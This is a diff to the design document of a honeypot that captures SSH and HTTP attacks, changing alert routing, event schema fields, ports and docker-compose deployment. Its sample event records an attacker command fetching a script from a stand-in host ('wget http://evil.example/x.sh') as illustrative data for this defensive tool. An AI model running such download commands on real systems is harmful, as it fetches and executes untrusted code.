@@ -81,21 +81,31 @@ One container, one asyncio event loop, zero external brokers. All modules above 
 | `api.py` | REST endpoints for stats/aggregates + WebSocket broadcast of live events |
 | `storage.py` | Async SQLAlchemy → PostgreSQL; repositories per entity |
 | `metrics.py` | `prometheus_client` export on `:8000` |
-| `alerts.py` | Threshold checks (brute-force rate, payload capture, retention lag, health) → Alertmanager |
+| `alerts.py` | **Deferred.** Prometheus evaluates alert rules; the backend exports metrics only and never pushes to Alertmanager |
 | `retention.py` | Scheduled purge of events older than 6 months |
 
 ### 3.2 `dashboard/` — React + Vite SPA
 
-- **Live feed** over WebSocket (new events as they land).
+- A **single-page threat-ops console**: live feed over WebSocket, KPI cards,
+  activity chart, technique mix, world map, top credentials/sources, payloads.
 - **Statistics** via REST polling (counts, top credentials, top source IPs, technique breakdown).
-- **Views**: live event table, charts (attacks over time, technique mix), geographic map, top-credentials panel.
-- Static build served by the dashboard container (port `:3000`).
+- Served by nginx on `:3000`; nginx proxies `/api` and `/ws` to `backend:8090`
+  so the browser uses one origin and no CORS. `VITE_API_MODE=mock` renders the
+  console without a backend.
 
 ### 3.3 `monitoring/` — Observability
 
-- **Prometheus** scrapes `backend:8000`; alert rules + recording rules.
-- **Alertmanager** routes alerts (webhook/email optional).
-- **Grafana** provisioned dashboards: main, SSH attacks, HTTP attacks, geographic heatmap, attack patterns.
+- **Prometheus** scrapes `backend:8000` and evaluates recording + alert rules.
+  It is the **single alerting authority**; thresholds live in
+  `monitoring/prometheus/rules/alerts.yml`.
+- **Alertmanager** routes alerts from Prometheus (webhook/email optional).
+  The backend does not push alerts to it.
+- **Grafana** (`:3001`) with **three** provisioned ops dashboards: **Overview**,
+  **Attack Patterns**, **Pipeline Health**. The geographic attack view is a
+  React-dashboard feature, not a Grafana one.
+- `fixtures` is a dev-only compose profile serving synthetic metrics on
+  `127.0.0.1:9101` so Grafana can be previewed before the backend exporter
+  exists; it must never be enabled in production.
 
 ### 3.4 PostgreSQL
 
@@ -111,16 +121,21 @@ One container, one asyncio event loop, zero external brokers. All modules above 
 {
   "service": "ssh | http",
   "source_ip": "203.0.113.7",
-  "ts": "2026-09-24T10:15:30Z",
-  "username": "root",
-  "password_hash": "sha256:<hex>",   // computed at the edge
+  "timestamp": "2026-09-24T10:15:30Z",       // NOT "ts"
+  "login_info": {
+    "username": "root",
+    "password_hash": "sha256:<hex>"           // computed at the edge
+  },
   "user_agent": "curl/8.0",
-  "http_method": "POST", "http_path": "/wp-login.php", "http_status": 200,
+  "http_method": "POST", "http_path": "/wp-login.php", "http_status_code": 200,
   "command": "wget http://evil.example/x.sh",
   "payload_url": "http://evil.example/x.sh",
-  "payload_sha256": "...", "payload_size": 1234
+  "payload_hash": "...", "payload_size": 1234
 }
 ```
+
+Password values are never accepted or returned — only `sha256:<64 hex>` hashes.
+Full REST/WS contract: `docs/API.md`.
 
 ## 5. MITRE ATT&CK classification
 
@@ -140,32 +155,60 @@ The attack simulator in `sim/simulate.py` asserts that synthetic attacks produce
 
 - **No plaintext credentials anywhere.** Passwords are hashed at the edge; only aggregates (+OSINT-grade metadata) are persisted.
 - **Payloads are never fetched or executed.** `wget`/`curl` return fake success; only the URL + hash + size are recorded. `CAPTURE_PAYLOADS=true` (opt-in, off by default) stages files into a **noexec quarantine** for manual static review.
-- **Network isolation**: the honeypot network has no egress; nothing reaches the host network.
-- **Alerts are meaningful**: rate-based (brute-force wave), on payload capture, on retention lag, on service health. There is deliberately **no "login success" alert** — the honeypot always accepts credentials, so it would fire on every event.
+- **Network egress is explicit.** The compose network is a plain bridge (not
+  `internal: true`) because the default `ip-api` GeoIP provider needs egress;
+  the honeypot never connects to attacker-supplied addresses. Containment —
+  allow-lists, offline MaxMind/GeoLite2, or `NullProvider` — is a backend-slice
+  decision, documented as a deliberate exception rather than silently granting
+  internet access.
+- **Alerts are meaningful**: rate-based (brute-force wave), payload capture,
+  retention lag and service health are evaluated by Prometheus. There is
+  deliberately **no "login success" alert** — the honeypot always accepts
+  credentials, so it would fire on every event. The backend does not push
+  alerts; `backend/alerts.py` is deferred.
 
 ## 7. Ports
 
 | Service | Container | Host |
 |---|---|---|
-| SSH honeypot (`sshd.py`) | 22 | 8022 |
+| SSH honeypot (`sshd.py`) | 8022 | 8022 |
 | HTTP honeypot (`httpd.py`) | 8081 | 8081 |
 | Metrics (`metrics.py`) | 8000 | 8000 |
 | Intake API (`api.py`) | 8090 | 8090 |
 | Dashboard (React SPA) | 80 | 3000 |
-| PostgreSQL | 5432 | 5432 |
+| PostgreSQL | 5432 | `127.0.0.1:5432` (loopback only) |
 | Prometheus | 9090 | 9090 |
 | Alertmanager | 9093 | 9093 |
-| Grafana | 3000 (container) | 3000 |
+| Grafana | 3000 | 3001 | (container→host)
+| Fixtures exporter (dev profile) | 9101 | `127.0.0.1:9101` |
+
+The SSH honeypot container listens on **8022** (`HB_SSH_PORT`), not 22, so host
+and container mappings match and there is no privileged port. Grafana is on
+host **3001** so the React console keeps `3000`.
 
 ## 8. Deployment
 
 Single-machine deployment via docker-compose (no Kubernetes in v1):
 
 ```bash
-docker-compose up -d
+docker compose up -d
 ```
 
-Healthcheck on every service; the pipeline and storage start only after PostgreSQL is reachable.
+The compose file is complete and `docker compose config` is valid. Monitoring
+services can start independently, and dashboard nginx keeps serving the SPA if
+the backend is absent. **The backend image is gated on backend slice 6**:
+`backend/Dockerfile` is empty until then, so `backend` is the only service that
+cannot build yet. PostgreSQL is healthchecked; the backend waits for it, while
+the dashboard depends on `service_started` (there is no backend healthcheck yet,
+and one would block forever on an unimplemented image).
+
+To preview Grafana before the backend exporter exists:
+
+```bash
+docker compose --profile fixtures up -d   # synthetic metrics on 127.0.0.1:9101
+```
+
+The fixtures profile is dev-only and must never be enabled in production.
 
 ## 9. Testing strategy
 
